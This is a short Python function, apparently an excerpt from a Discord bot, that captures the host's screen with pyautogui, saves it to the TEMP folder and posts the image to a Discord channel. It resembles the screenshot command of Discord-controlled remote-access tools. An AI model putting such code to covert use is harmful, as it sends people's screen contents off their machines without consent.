
async def screenshot():
    screenshot = pyautogui.screenshot()
    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    screenshot.save(path)
    file = discord.File(path)
    embed = discord.Embed(title="Screenshot", color=0xfafafa)
    embed.set_image(url="attachment://screenshot.png")
    await message.reply(embed=embed, file=file)